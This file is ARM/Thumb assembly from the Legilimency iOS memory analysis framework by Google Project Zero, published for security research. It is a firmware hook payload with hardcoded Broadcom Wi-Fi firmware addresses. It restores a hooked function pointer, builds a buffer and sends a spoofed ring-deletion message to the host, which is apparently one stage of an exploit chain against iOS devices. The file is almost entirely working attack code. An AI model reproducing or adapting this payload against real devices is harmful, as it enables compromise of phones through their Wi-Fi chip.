//  Legilimency - Memory Analysis Framework for iOS
//  --------------------------------------
//
//  Written and maintained by Gal Beniamini <laginimaineb@google.com>
//
//  Copyright 2017 Google Inc. All Rights Reserved.
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.
.code 16
  PUSH {R0}
  ADR R0, hook_arm
  BX R0

.code 32
.align 4
hook_arm:
  POP {R0}

  PUSH {R4-R11, LR}

  //Restoring the original function pointer to prevent being called more than once
  LDR R0, wl_hc_addr
  LDR R1, wl_hc_orig_func
  STR R1, [R0]
  
  LDR R11, ctx          //context

  //Sending a spoofed ring deletion request
  LDR R4, malloc
  MOV R0, #0x18 
  BLX R4
  MOV R10, R0           //buffer

  LDR R4, memset
  MOV R0, R10
  MOV R1, #0
  MOV R2, #0x18
  BLX R4

  MOV R0, #6
  STRB R0, [R10, #0x0]  //msg_type
  MOV R0, #6
  STRH R0, [R10, #0xA]  //ring ID

  LDR R4, send_d2h_message
  MOV R0, R11
  MOV R1, R10
  BLX R4

  LDR R4, free
  MOV R0, R10
  BLX R4

  //Returning zero
  MOV R0, #0
  POP {R4-R11, PC}

.align 4
wl_hc_addr:
  .word 0x2078B0

.align 4
wl_hc_orig_func:
  .word 0x17FB55

.align 4
ctx:
  .word 0x201A70

.align 4
malloc:
  .word 0x2F0A5

.align 4
memset:
  .word 0x3EB5

.align 4
send_d2h_message:
  .word 0x150A5

.align 4
free:
  .word 0x2F0C9

.align 4
padding:
  .word 0xABABABAB
  .word 0xBCBCBCBC
